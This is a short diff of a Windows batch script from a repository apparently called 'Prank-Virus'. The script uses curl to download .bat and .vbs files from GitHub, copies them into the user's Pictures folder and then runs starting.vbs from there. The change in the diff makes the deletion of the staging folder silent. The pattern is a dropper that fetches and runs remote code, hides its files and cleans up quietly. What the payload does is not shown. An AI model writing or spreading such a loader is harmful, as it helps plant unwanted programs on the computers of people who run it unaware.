@@ -5,7 +5,7 @@ curl https://raw.githubusercontent.com/PottersGame/Prank-Virus/main/Hiden_Zubor/
 curl https://raw.githubusercontent.com/PottersGame/Prank-Virus/main/Hiden_Zubor/Props/Programbatbat.bat -o Props\Programbatbat.bat
 curl https://raw.githubusercontent.com/PottersGame/Prank-Virus/main/Hiden_Zubor/Props/starting.vbs -o Props\starting.vbs
 xcopy /e /v Props %USERPROFILE%\Pictures\Props
-del Props
+del /Q Props
 C:
 CD %USERPROFILE%\Pictures\Props
 starting.vbs -o
